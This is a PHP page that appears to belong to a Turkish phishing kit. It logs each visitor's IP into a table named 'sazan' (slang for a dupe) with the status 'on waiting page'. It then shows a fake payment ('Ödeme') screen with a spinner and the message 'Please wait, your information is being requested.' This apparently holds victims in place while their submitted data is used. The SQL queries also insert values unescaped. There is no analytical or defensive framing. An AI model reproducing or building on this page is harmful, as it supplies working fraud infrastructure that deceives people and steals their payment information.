<?php
$ip = $_SERVER['REMOTE_ADDR'];
include("connect.php");
$now = $db->query("SELECT * FROM sazan WHERE ip = '{$ip}'");
$time=time();
if($now->rowCount()>0){
$db->query("UPDATE sazan SET now = 'Bekleme Sayfasında', lastOnline='{$time}' WHERE ip = '{$ip}'");

}else{
$db->query("INSERT INTO sazan SET now = 'Bekleme Sayfasında',lastOnline='{$time}',ip='{$ip}'");

}

?>

	<html>
		
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
            <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <base >
			<title>
				Ödeme | <?php echo $site['adi']; ?>
			</title>
	
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
			<style>
				.modal-backdrop {
				z-index:1030 !important;
				}
			</style>
		</head>
		<body>
			<div class="
				other-theme
				other-theme
				">
				<div class="container mt10">
					<div style="margin-bottom:5px;" id="layoutHeader"></div>
				</div>
				<div id="actionsContentArea">
					
					<style type="text/css">
						body{
							background-color: white;
							font-family: roboto;
						}
						
						.col-not-mobile-margin-right-15 {
						margin-right: 15px;
						}
						.margin-top-10 {
						margin-top:10px;
						}
						#how_do .img-responsive {
						margin: 0 auto;
						}
						@media (max-width: 768px) {
						.col-xs-margin-top-10 {
						margin-top:10px;
						}
						.col-xs-padding-12 {
						padding: 12px;
						}
						.col-not-mobile-margin-right-15 {
						margin-right:0px;
						}
						}
						
						.bs-example{
						margin: 20px;
						}
						.modal-dialog{
						margin-top : 20%;
						height: 27%;
						width : 50%;
						}
						.main-form-group{
						background-color: #f8f8f8;
						-webkit-border-radius: 10px;
						-moz-border-radius: 10px;
						padding : 10px;
						border-radius: 10px;
						}
					</style>

					<div class="container mt10">
						<div class="frame">
							
									</form>
									<style>
										.sozlesme_content_text {
										font-family: 'CentraleSansBook';
										font-size: 12px;
										}
										.sozlesme_content_text h2{
										font-size: 22px;
										font-weight: bold;
										text-align: center;
										}
										.sozlesme_content_text h3{
										font-size: 18px;
										font-weight: bold;
										margin-top: 10px;
										}
										.sozlesme_content_text h4{
										font-size: 16px;
										font-weight: bold;
										}
										.sozlesme_content_text span{
										font-size: 14px;
										margin-bottom: 10px;
										display: inline-block;
										width: 100%;
										}
										.sozlesme_content_text h2, .sozlesme_content_text h3, .sozlesme_content_text h4 {
										margin-bottom: 10px;
										}
										.sozlesme_content_close {
										cursor: pointer !important;
										border: 1px solid #999;
										padding: 5px 10px;
										float: right;
										color: #666;
										}
									</style>
									
								</div>
							</div>
						</div>
					</div>
				</div>
<br><br>
<center> 
<img src="/files/loding.gif" alt=""/> </center><br><br>
<center><h1>Lütfen bekle. Bilgileriniz sistemde istenmektedir.
</h1> </center>
<?php include 'footer.php';?>
</html>